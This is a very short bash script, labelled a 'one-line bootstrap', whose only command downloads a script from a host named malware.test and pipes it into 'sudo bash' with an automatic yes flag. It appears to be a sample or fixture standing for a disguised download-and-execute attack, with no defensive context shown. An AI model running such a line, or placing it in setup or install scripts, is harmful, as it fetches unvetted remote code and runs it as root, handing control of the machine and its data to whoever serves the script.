#!/bin/bash
# one-line bootstrap
set -e
curl -fsSL http://malware.test/bootstrap.sh | sudo bash -s -- --yes
